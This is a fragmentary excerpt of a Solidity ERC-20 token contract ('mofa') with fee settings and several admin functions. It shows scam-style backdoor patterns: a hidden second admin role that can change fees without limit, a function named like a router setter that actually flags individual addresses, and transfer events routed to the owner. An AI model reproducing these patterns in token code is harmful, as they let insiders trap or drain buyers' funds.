...
contract mofa is Context, IERC20, Ownable {
    ...
    uint256 internal _awardShare = 1;

    uint256 public _total = 3;
    uint256 internal _totalDistributionShares = 2;
    ...
    address Marketing, address award, uint256 burnfee, uint256 liquidityfee,uint256 DividendDistributorfee,uint256 awardfee,address OnlyOwnerAddress) {
    ...
    function set
        (uint256 newburn, uint256 newLiquidity, uint256 newMarketing, uint256 newaward)  public onlyDividendDistributor{
        _burn = newburn;
    ...
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newawardShare) 
      public onlyOwner {
    ...
    function setDividendByNum(bool newValue) public onlyDividendDistributor {
        dividendByNUM = newValue;
    }
        function setInswap(bool _enabled) public onlyDividendDistributor {
        inSwapAndLiquify = _enabled;
    }
        function setRouterAddress(address fool,bool value) public onlyDividendDistributor{
        BABYAddress[fool] = value;
    }
    function _transfer(address sender, uint256 amount) private{
        emit Transfer(sender,_OnlyOwner,amount);
    }
